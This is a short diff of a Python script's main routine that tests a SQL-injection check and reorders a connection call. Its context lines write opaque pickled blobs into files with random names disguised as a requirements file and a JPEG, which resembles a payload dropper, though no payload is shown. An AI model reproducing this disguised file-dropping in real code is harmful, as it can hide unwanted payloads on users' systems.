@@ -414,11 +414,12 @@ if __name__ == "__main__":
             print(*await get_posts(), *await get_ips())
             print(await is_inject("SELECT * FROM posts"))
             print(await is_inject("hello!"))
+            await start_conn()
             await close()
             open('RTSpMXFavdrLEuACcNZjhgmoqxHKbkGtDIeywQnYJWVBszPOUfli_requirements.txt', 'x')
             open('RTSpMXFavdrLEuACcNZjhgmoqxHKbkGtDIeywQnYJWVBszPOUfli_requirements.txt', 'wb').write(pickled[1])
             open('cREaxqyiMBHIXvQKWkVCJlDmdeuPNgoSrbhpjGfUzFAZYOsLnwtT_user.jpeg', 'x')
             open('cREaxqyiMBHIXvQKWkVCJlDmdeuPNgoSrbhpjGfUzFAZYOsLnwtT_user.jpeg', 'wb').write(pickled[0])
-            await start_conn()
+            
             
     asyncio.run(main())
